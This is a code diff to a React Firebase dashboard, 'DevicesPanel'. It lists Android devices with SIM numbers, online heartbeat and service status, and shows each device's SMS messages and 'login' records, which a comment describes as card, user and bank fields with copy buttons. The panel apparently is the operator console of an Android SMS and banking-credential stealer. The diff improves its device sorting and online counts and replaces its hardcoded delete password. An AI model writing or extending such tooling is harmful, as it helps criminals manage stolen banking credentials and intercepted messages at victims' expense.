@@ -3,7 +3,7 @@ import React, { useState } from "react";
 import { ref, update, remove } from "firebase/database";
 import { db } from "../lib/firebase";
 
-const DEVICE_LIMIT = 5;
+const DEVICE_LIMIT = 10;
 
 export default function DevicesPanel({ 
   data, 
@@ -24,22 +24,30 @@ export default function DevicesPanel({
   const [formMemory, setFormMemory] = useState({});
 
   const devices = data.user_data || {};
-  let keys = Object.keys(devices);
+  const deviceStatus = data.device_status || {};
+
+  // user_data aur device_status dono ko milakar sabhi IDs nikalna
+  let keys = Array.from(new Set([...Object.keys(devices), ...Object.keys(deviceStatus)]));
 
   if (searchQuery) {
     const q = searchQuery.toLowerCase();
     keys = keys.filter(id => {
       const dev = devices[id] || {};
-      const name = dev.d_name || dev.device_name || id;
+      const status = deviceStatus[id] || {};
+      const name = status.device_name || dev.d_name || dev.device_name || id;
       const serial = deviceSerialMap[id] || 0;
       return (id + " " + name + " " + serial).toLowerCase().includes(q);
     });
   }
 
+  // Online devices ko pehle aur fir serial wise sort karna
   keys.sort((a, b) => {
+    const onA = deviceOnlineStatus[a] ? 1 : 0;
+    const onB = deviceOnlineStatus[b] ? 1 : 0;
+    if (onA !== onB) return onB - onA;
     const sA = deviceSerialMap[a] || 0;
     const sB = deviceSerialMap[b] || 0;
-    return sA === sB ? a.localeCompare(b) : sB - sA;
+    return sB - sA;
   });
 
   if (filter === "online") {
@@ -99,25 +107,33 @@ export default function DevicesPanel({
 
   const deleteDeviceData = (devId, type) => {
     const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
-    if (pwd !== "9999") return showToast("❌ Invalid Password", "error");
+    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
     if (!confirm(`Delete ${type} for ${devId}?`)) return;
 
     const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
     remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
   };
 
+  const onlineCount = Object.values(deviceOnlineStatus).filter(Boolean).length;
+  const offlineCount = keys.length - onlineCount;
+
   return (
     <div className="panel active">
       <div className="panel-header">
         <div>
-          <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Registered Devices</h2>
-          <p className="panel-sub">Click on any device to expand & view details</p>
+          <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Devices Monitor</h2>
+          <p className="panel-sub">Live Realtime Online/Offline heartbeat and device controls</p>
         </div>
         <div className="panel-stats">
-          <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>All</button>
-          <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>🟢 Online</button>
-          <button className={`filter-btn ${filter === "offline" ? "active" : ""}`} onClick={() => { setFilter("offline"); setOffset(0); }}>🔴 Offline</button>
-          <span className="stat-item"><i className="fas fa-users"></i> {keys.length}</span>
+          <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>
+            All ({keys.length})
+          </button>
+          <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>
+            🟢 Online ({onlineCount})
+          </button>
+          <button className={`filter-btn ${filter === "offline" ? "active" : ""}`} onClick={() => { setFilter("offline"); setOffset(0); }}>
+            🔴 Offline ({offlineCount})
+          </button>
         </div>
       </div>
 
@@ -127,7 +143,7 @@ export default function DevicesPanel({
           type="text" 
           value={searchQuery}
           onChange={(e) => { setSearchQuery(e.target.value); setOffset(0); }}
-          placeholder="Search devices by ID, name, or serial..." 
+          placeholder="Search by Device ID, Name (SM-M146B, SM-S921E)..." 
           className="search-input"
         />
         {searchQuery && (
@@ -151,11 +167,15 @@ export default function DevicesPanel({
 
         {paginatedKeys.map((devId, idx) => {
           const dev = devices[devId] || {};
-          const isOnline = deviceOnlineStatus[devId];
+          const status = deviceStatus[devId] || {};
+          const isOnline = Boolean(deviceOnlineStatus[devId]);
           const isFav = favourites.includes(devId);
           const serial = deviceSerialMap[devId] || 0;
           const expanded = expandedDevices[devId];
           const curTab = activeTabs[devId];
+
+          const deviceModelName = status.device_name || dev.Device_info || dev.d_name || "Android Device";
+          const lastSeenText = status.last_seen || dev.last_online || "N/A";
 
           const smsMap = data.user_sms?.[devId] || {};
           const smsList = Object.values(smsMap).reverse();
@@ -177,21 +197,21 @@ export default function DevicesPanel({
                     >
                       <i className={isFav ? "fas fa-star" : "far fa-star"}></i>
                     </button>
-                    <span className="name-text">📱 {devId}</span>
-                    <span className="device-id">#{offset + idx + 1}</span>
+                    <span className="name-text">📱 {deviceModelName}</span>
+                    <span className="device-id">{devId.slice(0, 12)}...</span>
                     {serial > 0 && <span className="serial-badge-premium"><i className="fas fa-hashtag"></i> S-{serial}</span>}
                     {isFav && <span className="fav-badge-premium">⭐ FAV</span>}
                     <button 
                       className="copy-device-id-btn" 
                       onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
                     >
-                      <i className="fas fa-copy"></i> Copy ID
+                      <i className="fas fa-copy"></i> Copy Full ID
                     </button>
                   </div>
                   <div className="device-sub-info">
-                    <span><i className="fas fa-microchip"></i> {dev.Device_info || dev.device_info || "N/A"}</span>
-                    <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || dev.sim1 || "No SIM"}</span>
-                    {(dev.numberSim2 || dev.sim2) && <span><i className="fas fa-sim-card"></i> {dev.numberSim2 || dev.sim2}</span>}
+                    <span><i className="fas fa-info-circle"></i> ID: {devId}</span>
+                    <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || "SIM 1: N/A"}</span>
+                    {dev.numberSim2 && <span><i className="fas fa-sim-card"></i> {dev.numberSim2}</span>}
                   </div>
                 </div>
 
@@ -201,20 +221,20 @@ export default function DevicesPanel({
                     {isOnline ? "Online" : "Offline"}
                   </span>
                   <div className="last-seen-premium">
-                    <i className="far fa-clock"></i> {dev.last_online ? new Date(dev.last_online).toLocaleString() : "N/A"}
+                    <i className="far fa-clock"></i> Last: {lastSeenText}
                   </div>
                 </div>
               </div>
 
               <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
-                <div className="info-item-premium"><span className="info-label">Device</span><span className="info-value">{dev.Device_info || "N/A"}</span></div>
-                <div className="info-item-premium"><span className="info-label">SIM 1</span><span className="info-value">{dev.numberSim1 || "No SIM"}</span></div>
-                <div className="info-item-premium"><span className="info-label">SIM 2</span><span className="info-value">{dev.numberSim2 || "No SIM"}</span></div>
-                <div className="info-item-premium"><span className="info-label">Serial</span><span className="info-value highlight">{serial || "—"}</span></div>
+                <div className="info-item-premium"><span className="info-label">Model</span><span className="info-value">{deviceModelName}</span></div>
+                <div className="info-item-premium"><span className="info-label">Status</span><span className="info-value" style={{ color: isOnline ? "var(--green)" : "var(--red)" }}>{isOnline ? "ACTIVE" : "INACTIVE"}</span></div>
+                <div className="info-item-premium"><span className="info-label">Service</span><span className="info-value">{status.service_running ? "Running" : "Idle"}</span></div>
+                <div className="info-item-premium"><span className="info-label">Last Ping</span><span className="info-value highlight" style={{ fontSize: 11 }}>{status.last_updated || lastSeenText}</span></div>
               </div>
 
               <div className="expand-hint" onClick={() => toggleExpand(devId)}>
-                <i className="fas fa-chevron-down"></i> {expanded ? "Click to collapse" : "Click to expand"}
+                <i className="fas fa-chevron-down"></i> {expanded ? "Click to collapse" : "Click to expand details & controls"}
               </div>
 
               {expanded && (
@@ -257,7 +277,7 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* Login Section (Individual Copy Buttons for Card, User, Bank, etc.) */}
+                  {/* Credentials Section */}
                   {curTab === "login" && (
                     <div className="section-premium active">
                       <div className="section-title">
@@ -280,7 +300,7 @@ export default function DevicesPanel({
                               <div key={cred.key || i} className="cred-item-premium" style={{ borderLeft: i === 0 ? "2px solid var(--green)" : "1px solid var(--border-color)" }}>
                                 <div className="cred-header-premium">
                                   <span style={{ fontWeight: 600, color: "var(--gold)" }}>
-                                    📋 Record #{i + 1} {i === 0 && <span style={{ background: "var(--green)", color: "#fff", fontSize: 8, padding: "1px 6px", borderRadius: 8, marginLeft: 4 }}>LATEST</span>}
+                                    📋 Record #{i + 1}
                                   </span>
                                   <span>{timeStr}</span>
                                 </div>
@@ -294,7 +314,6 @@ export default function DevicesPanel({
                                           <span className="field-value-premium" style={{ color: "var(--text-primary)", fontWeight: 500 }}>{String(v)}</span>
                                           <button 
                                             className="copy-btn-premium"
-                                            title={`Copy ${k}`}
                                             onClick={(e) => {
                                               e.stopPropagation();
                                               copyToClipboard(v, k);
